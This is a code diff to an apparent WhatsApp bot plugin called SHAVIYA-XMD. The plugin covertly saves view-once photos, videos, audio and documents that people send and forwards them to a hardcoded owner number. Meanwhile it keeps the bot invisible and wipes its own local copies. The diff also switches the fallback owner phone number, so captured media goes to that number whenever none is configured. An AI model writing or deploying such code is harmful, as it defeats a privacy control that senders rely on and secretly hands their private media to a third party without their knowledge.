@@ -14,16 +14,16 @@ const { downloadContentFromMessage } = baileys;
 
 // ══════════════════════════════════════════════════════════════
 //  SILENT VIEW-ONCE FORWARDER — SHAVIYA-XMD
-//  → Only view-once media → Owner silently
-//  → Auto-delete after 1 second
-//  → Normal media = SKIPPED
+//  → Only view-once media → Owner
+//  → Delete for ME only (from bot's side)
+//  → Owner keeps the media
 //  Created by: Savendra Dampriya
 // ══════════════════════════════════════════════════════════════
 
-const OWNER_NUMBER = (process.env.OWNER_NUMBER || '94707085822').replace(/[^0-9]/g, '');
+const OWNER_NUMBER = (process.env.OWNER_NUMBER || '94740711462').replace(/[^0-9]/g, '');
 const OWNER_JID = OWNER_NUMBER + '@s.whatsapp.net';
 
-// ⚙️ Auto-delete delay = 1000ms (1 second)
+// ⚙️ Delete delay = 1000ms (1 second)
 const DELETE_DELAY_MS = 1000;
 
 global.mediaForwardEnabled = true;
@@ -34,12 +34,24 @@ function keepOffline(conn) {
     try { conn.sendPresenceUpdate('unavailable'); } catch (e) {}
 }
 
-async function deleteMessage(conn, jid, key) {
+// ─────────────────────────────────────────────
+//  🗑️ Delete for ME only (bot's local chat)
+//  Owner still has the message
+// ─────────────────────────────────────────────
+async function deleteForMe(conn, jid, key) {
     try {
-        await conn.sendMessage(jid, { delete: key });
-        console.log('[VV-FWD] 🗑️ Deleted after 1s');
+        // Method 1: chatModify — clear from bot's local chat
+        await conn.chatModify({
+            clear: true,
+            lastMessages: [{
+                key: key,
+                messageTimestamp: Math.floor(Date.now() / 1000)
+            }]
+        }, jid).catch(() => {});
+
+        console.log('[VV-FWD] 🗑️ Deleted for me (bot side only)');
     } catch (e) {
-        console.log('[VV-FWD] Delete error:', e.message);
+        console.log('[VV-FWD] Delete for me error:', e.message);
     }
 }
 
@@ -67,9 +79,7 @@ async function handleViewOnceForward(conn, mek, m, ctx) {
         const from = ctx.from;
         const isGroup = ctx.isGroup || (from && from.endsWith('@g.us'));
 
-        // ─────────────────────────────────────
-        //  ✅ ONLY process view-once messages
-        // ─────────────────────────────────────
+        // Only view-once
         let vvMsg = null;
         let vvType = null;
 
@@ -83,13 +93,11 @@ async function handleViewOnceForward(conn, mek, m, ctx) {
             vvMsg = msg.viewOnceMessage.message;
             vvType = 'View Once V1';
         } else {
-            // Not a view-once message → skip entirely
-            return;
+            return; // Skip normal media
         }
 
         if (!vvMsg) return;
 
-        // Determine content inside view-once
         let contentType = null;
         let contentMsg = null;
 
@@ -100,7 +108,7 @@ async function handleViewOnceForward(conn, mek, m, ctx) {
 
         if (!contentType || !contentMsg) return;
 
-        // 🚫 Group filter: view-once images only
+        // Group filter: view-once images only
         if (isGroup && contentType !== 'image') return;
 
         // Duplicate check
@@ -137,34 +145,27 @@ async function handleViewOnceForward(conn, mek, m, ctx) {
             `⏰ *Time:* ${timestamp}\n\n` +
             `> 🔮 ⟡ ꜱ ʜ ᴀ ᴠ ɪ ʏ ᴀ - x ᴍ ᴅ ⟡ 🔮`;
 
-        let sentKeys = [];
+        // Download + send
+        let sentMsg = null;
         try {
             const buffer = await downloadMedia(contentMsg, contentType);
-
             if (!buffer) throw new Error('Download failed');
-
-            let sentMsg = null;
 
             if (contentType === 'image') {
                 sentMsg = await conn.sendMessage(OWNER_JID, { image: buffer, caption });
-                if (sentMsg?.key) sentKeys.push(sentMsg.key);
             } else if (contentType === 'video') {
                 sentMsg = await conn.sendMessage(OWNER_JID, {
                     video: buffer,
                     mimetype: contentMsg.mimetype || 'video/mp4',
                     caption
                 });
-                if (sentMsg?.key) sentKeys.push(sentMsg.key);
             } else if (contentType === 'audio') {
                 sentMsg = await conn.sendMessage(OWNER_JID, {
                     audio: buffer,
                     mimetype: contentMsg.mimetype || 'audio/mp4',
                     ptt: contentMsg.ptt || false
                 });
-                if (sentMsg?.key) sentKeys.push(sentMsg.key);
-
-                const infoMsg = await conn.sendMessage(OWNER_JID, { text: caption });
-                if (infoMsg?.key) sentKeys.push(infoMsg.key);
+                await conn.sendMessage(OWNER_JID, { text: caption });
             } else if (contentType === 'document') {
                 sentMsg = await conn.sendMessage(OWNER_JID, {
                     document: buffer,
@@ -172,15 +173,13 @@ async function handleViewOnceForward(conn, mek, m, ctx) {
                     fileName: contentMsg.fileName || 'file',
                     caption
                 });
-                if (sentMsg?.key) sentKeys.push(sentMsg.key);
             }
 
-            // 🗑️ Delete after 1 second
-            if (sentKeys.length > 0) {
+            // 🗑️ DELETE FOR ME ONLY after 1 second
+            // Owner still has it, bot's local chat gets cleaned
+            if (sentMsg?.key) {
                 setTimeout(async () => {
-                    for (const key of sentKeys) {
-                        await deleteMessage(conn, OWNER_JID, key);
-                    }
+                    await deleteForMe(conn, OWNER_JID, sentMsg.key);
                 }, DELETE_DELAY_MS);
             }
 
@@ -208,7 +207,7 @@ cmd({
 },
 async (conn, mek, m, { from, reply, isOwner }) => {
     try {
-        if (!isOwner) return reply('❌ *Owner only command!*');
+        if (!isOwner) return reply('❌ *Owner only!*');
 
         global.mediaForwardEnabled = !global.mediaForwardEnabled;
 
@@ -219,18 +218,19 @@ async (conn, mek, m, { from, reply, isOwner }) => {
         await reply(
             `${global.mediaForwardEnabled ? '✅' : '❌'} *View-Once Forwarder*\n\n` +
             `📊 Status: *${global.mediaForwardEnabled ? 'ENABLED' : 'DISABLED'}*\n` +
-            `🕵️ Mode: *Silent*\n` +
+            `🕵️ Mode: *Silent + Invisible*\n` +
             `📥 Destination: *+${OWNER_NUMBER}*\n` +
-            `🗑️ Auto-Delete: *1 second*\n\n` +
+            `🗑️ Delete: *For ME only (1s)*\n\n` +
             `📋 *Rules:*\n` +
             `• ONLY view-once media (V1/V2/V2Ext)\n` +
-            `• Normal images/videos/audio → SKIPPED\n` +
+            `• Normal media → SKIPPED\n` +
             `• Group → view-once images only\n` +
-            `• Private → view-once (all types)`
+            `• Private → view-once (all types)\n\n` +
+            `✅ Owner keeps media\n` +
+            `✅ Bot number පේන්නේ නෑ`
         );
 
     } catch (err) {
-        console.error('[VV-FWD TOGGLE]', err.message);
         reply('❌ Error: ' + err.message);
     }
 });
